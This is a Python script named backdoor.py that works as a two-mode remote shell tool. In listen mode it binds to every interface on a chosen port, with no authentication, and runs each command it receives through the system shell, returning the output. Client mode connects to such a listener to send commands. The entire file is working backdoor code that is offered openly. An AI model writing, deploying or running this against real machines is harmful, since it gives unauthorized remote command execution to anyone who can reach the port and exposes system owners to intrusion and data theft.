import socket
import getopt
import sys
import subprocess
from threading import Thread

def usage():
    print('Usage info:')
    print('Help: python backdoor.py -h')
    print('Client: python backdoor.py -t [target] -p [port]')
    print('Server: python backdoor.py -l -p [port]')
    sys.exit()

def client_handle(target, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target, port))
    while True:
        response = b""
        while True:
            data = client.recv(4096)
            response += data
            if len(data) < 4096:
                break
        print(response.decode('utf-8'), end='')
        buffer = input('') + '\n'
        client.send(buffer.encode('utf-8'))

def server_handle(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f'[*] Listening on 0.0.0.0:{port}')
    while True:
        client_socket, address = server.accept()
        print(f'[*] Accepted connection from {address[0]}:{address[1]}')
        client_thread = Thread(target=run_command, args=(client_socket,))
        client_thread.start()

def run_command(client_socket):
    client_socket.send(b"shell_> ")
    while True:
        cmd_buffer = b""
        while b"\n" not in cmd_buffer:
            cmd_buffer += client_socket.recv(1024)
        try:
            output = subprocess.check_output(cmd_buffer.strip(), stderr=subprocess.STDOUT, shell=True)
            client_socket.send(output + b"\nshell_> ")
        except Exception as e:
            client_socket.send(str(e).encode() + b"\nshell_> ")

def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:p:hl")
    except getopt.GetoptError as err:
        print(err)
        usage()

    target = ""
    port = 0
    listen = False

    for o, a in opts:
        if o == "-h":
            usage()
        elif o == "-t":
            target = a
        elif o == "-p":
            port = int(a)
        elif o == "-l":
            listen = True

    if listen and port > 0:
        server_handle(port)
    elif target and port > 0:
        client_handle(target, port)
    else:
        usage()

if __name__ == "__main__":
    main()
